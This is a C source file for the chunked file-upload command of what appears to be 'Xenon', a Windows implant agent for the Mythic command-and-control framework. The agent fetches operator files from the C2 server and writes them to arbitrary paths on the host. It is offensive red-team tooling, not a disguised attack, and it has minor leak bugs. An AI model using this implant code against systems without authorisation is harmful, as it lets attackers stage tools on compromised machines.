#include "Tasks/Upload.h"

#include <windows.h>
#include "Xenon.h"
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_UPLOAD

#define CHUNK_SIZE  512000      // 512 KB


/**
 * @brief Retrieve file from Mythic in chunks.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] upload FILE_UPLOAD struct which contains details of a file
 * @return DWORD
 */
// DWORD UploadChunked(_In_ PCHAR taskUuid, _Inout_ PFILE_UPLOAD File)
// {
//     _dbg("Starting Chunked Upload...");

//     DWORD Status = 0;

//     File->currentChunk = 1;

//     do
//     {
//     /*
//      * Prepare the package to request current chunk
//      * - chunk_num
//      * - file_id
//      * - full_path
//      * - chunk_size
//     */
//         PPackage data = PackageInit(NULL, FALSE);
//         PackageAddByte(data, UPLOAD_CHUNKED);
//         PackageAddString(data, taskUuid, FALSE);
//         PackageAddInt32(data, File->currentChunk);
//         PackageAddBytes(data, File->fileUuid, TASK_UUID_SIZE, FALSE);
//         PackageAddString(data, File->filepath, TRUE);
//         PackageAddInt32(data, CHUNK_SIZE);

//         // Send the package and receive the response
//         // PARSER Response = { 0 };
//         // PackageSend(data, &Response);
//         // PackageDestroy(data);
//         PackageQueue(data);



//         BYTE success = ParserGetByte(&Response);
//         if (success == FALSE)
//         {
//             _err("UploadChunked returned failure status for chunk %d.", File->currentChunk);
//             Status = ERROR_MYTHIC_UPLOAD;
//             ParserDestroy(&Response);
//             break;
//         }
        
//     /*
//      * Response will ALWAYS hold data in the following order:
//      * - File_id
//      * - total_chunks
//      * - chunk_num
//      * - chunk_data
//     */
//         // Get file_id from response
//         SIZE_T uuidLen  = TASK_UUID_SIZE;
//         PCHAR fileUuid = ParserGetString(&Response, &uuidLen);
//         if (fileUuid == NULL) 
//         {
//             _err("Failed to get UUID from response.");
//             Status = ERROR_MYTHIC_UPLOAD;
//             ParserDestroy(&Response);
//             break;
//         }
        
//         // Copy file_id
//         strncpy(File->fileUuid, fileUuid, TASK_UUID_SIZE + 1);
//         File->fileUuid[TASK_UUID_SIZE + 1] = '\0';
        
//         // Get total_chunks from response
//         File->totalChunks = ParserGetInt32(&Response);

//         // Current chunk number retrieved
//         File->currentChunk = ParserGetInt32(&Response);

//         // Get chunk data from the response
//         SIZE_T bytesRead = 0;
//         PBYTE chunk = ParserGetBytes(&Response, &bytesRead);
//         if (!chunk)
//         {
//             _err("Failed to get chunk data for chunk %d.", File->currentChunk);
//             Status = ERROR_MYTHIC_UPLOAD;
//             ParserDestroy(&Response);
//             break;
//         }

//         _dbg("Received %d bytes for chunk %d.", bytesRead, File->currentChunk);

//         // Write chunk data to the file
//         DWORD bytesWritten = 0;
//         if (!WriteFile(File->hFile, chunk, (DWORD)bytesRead, &bytesWritten, NULL))
//         {
//             DWORD error = GetLastError();
//             _err("Failed to write to file. ERROR CODE: %d", error);
//             Status = error;
//             ParserDestroy(&Response);
//             break;
//         }

//         if (bytesWritten != bytesRead)
//         {
//             _err("Incomplete write for chunk %d. Expected: %d, Written: %d", File->currentChunk, bytesRead, bytesWritten);
//             Status = ERROR_MYTHIC_UPLOAD;
//             ParserDestroy(&Response);
//             break;
//         }

//         // Clean up and prepare for the next chunk
//         File->currentChunk++;
//         ParserDestroy(&Response);

//     } while (File->currentChunk <= File->totalChunks);

//     _dbg("Chunked upload complete. Total chunks processed: %d", File->currentChunk - 1);

//     return Status;
// }

/**
 * @brief Request chunk of file upload from the server
 */
VOID UploadGetChunk(_In_ PFILE_UPLOAD File)
{
    PPackage data = PackageInit(NULL, FALSE);
    PackageAddByte(data, UPLOAD_CHUNKED);
    PackageAddBytes(data, File->TaskUuid, TASK_UUID_SIZE, FALSE);
    PackageAddInt32(data, File->currentChunk);
    PackageAddBytes(data, File->fileUuid, TASK_UUID_SIZE, FALSE);
    PackageAddString(data, File->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);

    PackageQueue(data);
}


/**
 * @brief Update any file upload chunks
 */
BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response)
{   
    UINT32 TotalChunks  = 0;
    UINT32 CurrentChunk = 0;
    PBYTE  ChunkBuf     = NULL;
    SIZE_T bytesRead    = 0;

    if (!TaskUuid || !Response)
        return FALSE;

    UINT32 Status = ParserGetInt32(Response);

    /* Extract Upload Response Details */
    TotalChunks  = ParserGetInt32(Response);
    CurrentChunk = ParserGetInt32(Response);
    ChunkBuf     = ParserGetBytes(Response, &bytesRead);

    _dbg("Task Id [%s] : Received %d bytes for chunk %d / %d.", TaskUuid, bytesRead, CurrentChunk, TotalChunks);

    PFILE_UPLOAD Current = xenonConfig->UploadQueue;
    PFILE_UPLOAD Prev    = NULL;

    while ( Current )
    {
        PFILE_UPLOAD Next = Current->Next;

        if ( strcmp(Current->TaskUuid, TaskUuid) == 0 )
        {
            /* Update Upload State */
            Current->currentChunk = CurrentChunk;
            Current->totalChunks  = TotalChunks;

            /* Write chunk if there is data */
            if (bytesRead > 0)
            {
                DWORD bytesWritten = 0;

                if ( !WriteFile(Current->hFile, ChunkBuf, (DWORD)bytesRead, &bytesWritten, NULL) )
                {
                    _err("Failed to write chunk to file. ERROR CODE: %d", GetLastError());
                    return FALSE;
                }

                /* Send updates to operator */
                _dbg("Wrote chunk %d (%d bytes)", CurrentChunk, bytesWritten);
                PPackage Pkg = PackageInit(NULL, FALSE);
                PackageAddFormatPrintf(Pkg, FALSE, "Uploaded %d / %d chunks ... \n\n", CurrentChunk, TotalChunks);
                PackageUpdate(Current->TaskUuid, Pkg);
            }

            /* Last chunk → finalize upload */
            if (CurrentChunk >= TotalChunks)
            {
                _dbg("Upload complete. %d / %d chunks", CurrentChunk, TotalChunks);

                PackageComplete(Current->TaskUuid, NULL);

                /* Unlink */
                if (Prev)
                    Prev->Next = Next;
                else
                    xenonConfig->UploadQueue = Next;

                UploadFree(Current);
                return TRUE;
            }

            /* Request next chunk */
            Current->currentChunk = CurrentChunk + 1;
            _dbg("Requesting next chunk %d", Current->currentChunk);
            UploadGetChunk(Current);

            return TRUE;
        }

        Prev    = Current;
        Current = Next;
    }

    return FALSE;
}


/**
 * @brief Add instance of FILE_UPLOAD to global tracker
 */
VOID UploadQueue(_In_ PFILE_UPLOAD File)
{
    _dbg("Adding file to upload queue...");
    
    PFILE_UPLOAD List = NULL;

    if ( !File ) {
        return;
    }
    
    /* If there are no queued files, this is the first */
    if ( !xenonConfig->UploadQueue )
    {
        xenonConfig->UploadQueue  = File;
    }
    else
    {
        /* Add to the end of linked-list */
        List = xenonConfig->UploadQueue;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next  = File;
    }
}


/**
 * @brief File upload via chunks
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID Upload(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    DWORD status;
    HANDLE hFile        = NULL;
    SIZE_T uuidLen      = 0;
    SIZE_T pathLen      = 0;
    PCHAR  FileUuid     = NULL;
    PCHAR  UploadPath   = NULL;
    PFILE_UPLOAD File   = NULL;

    File = (PFILE_UPLOAD)LocalAlloc(LPTR, sizeof(FILE_UPLOAD));         // Must Free

    if ( File == NULL )
    {
        _err("Failed to allocate for file upload");
        return;
    }

    /* Set Details for Upload */
    FileUuid    = ParserGetString(arguments, &uuidLen);
    UploadPath  = ParserGetString(arguments, &pathLen);

    strncpy(File->fileUuid, FileUuid, uuidLen);
    strncpy(File->filepath, UploadPath, pathLen);
    strncpy(File->TaskUuid, taskUuid, TASK_UUID_SIZE);

    File->currentChunk = 1;


    File->hFile = CreateFileA(UploadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (File->hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Error opening file %s : ERROR CODE %d", UploadPath, error);
        PackageError(taskUuid, error);
        goto end;
    }

    _dbg("[UPLOAD] FilePath: %s | FileUUID: %s", File->filepath, File->fileUuid);

    /* Get first chunk from server */
    UploadGetChunk(File);
    
    /* Add Upload Instance to Queue */
    UploadQueue(File);

end:

    return;
}


/**
 * @brief Free the upload
 */
VOID UploadFree(_In_ PFILE_UPLOAD File)
{
    if ( !File )
        return;

    if ( File->hFile ) 
    {
        CloseHandle(File->hFile);
        File->hFile = NULL;
    }

    LocalFree(File);
    File = NULL;
}


#endif  //INCLUDE_CMD_UPLOAD